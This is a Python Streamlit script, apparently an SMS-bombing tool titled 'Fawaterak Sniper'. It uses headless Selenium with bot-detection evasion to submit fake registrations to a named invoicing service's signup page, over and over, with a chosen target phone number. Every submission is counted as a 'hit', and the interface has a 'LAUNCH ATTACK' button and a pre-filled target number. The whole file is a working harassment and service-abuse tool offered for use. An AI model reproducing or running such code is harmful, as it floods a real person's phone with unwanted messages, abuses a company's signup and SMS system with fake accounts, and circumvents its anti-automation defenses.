import streamlit as st
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# إعدادات الصفحة
st.set_page_config(page_title="FAWATERAK ELITE", page_icon="⚡")

# تهيئة الجلسة
if 'count' not in st.session_state: st.session_state.count = 0
if 'logs' not in st.session_state: st.session_state.logs = []
if 'running' not in st.session_state: st.session_state.running = False

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 10: st.session_state.logs.pop(0)

def run_fawaterak_attack(phone):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    # أهم سطر لإخفاء إنك روبوت
    options.add_argument("--disable-blink-features=AutomationControlled")
    
    driver = None
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        wait = WebDriverWait(driver, 10)
        
        driver.get("https://app.fawaterk.com/register")
        
        # الانتظار حتى تظهر خانة الهاتف بناءً على الـ Placeholder اللي في صورتك
        phone_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder*='01xxxxxxxx']")))
        
        # ملء بيانات عشوائية لتفعيل الزرار
        inputs = driver.find_elements(By.TAG_NAME, "input")
        inputs[0].send_keys("Mahmoud Abdalla") # Full Name
        inputs[1].send_keys("Tech Solutions") # Business Name
        inputs[2].send_keys(f"user_{int(time.time())}@gmail.com") # Email
        inputs[3].send_keys("Pass123!@#") # Password
        
        phone_input.send_keys(phone)
        
        # الضغط على زر إنشاء الحساب
        submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Create an Account')]")
        driver.execute_script("arguments[0].click();", submit_btn)
        
        time.sleep(2)
        st.session_state.count += 1
        add_log(f"✅ Hit Sent to {phone}")
        
    except Exception as e:
        add_log("❌ Security Blocked or Timeout")
    finally:
        if driver: driver.quit()

# --- UI Interface ---
st.title("⚡ Fawaterak Sniper")
target = st.text_input("Enter Target Number", value="01124912480")

c1, c2 = st.columns(2)
if c1.button("🚀 LAUNCH ATTACK", use_container_width=True):
    st.session_state.running = True
    add_log("System Online...")

if c2.button("🛑 STOP", use_container_width=True):
    st.session_state.running = False
    add_log("System Offline.")

st.metric("SUCCESS HITS", st.session_state.count)

# تصليح الـ Label اللي كان مسبب إيرور في صورتك الثالثة
st.subheader("Console Output")
log_content = "\n".join(st.session_state.logs[::-1])
st.text_area(label="Live Logs", value=log_content, height=200, disabled=True, label_visibility="collapsed")

if st.session_state.running:
    run_fawaterak_attack(target)
    time.sleep(1)
    st.rerun()
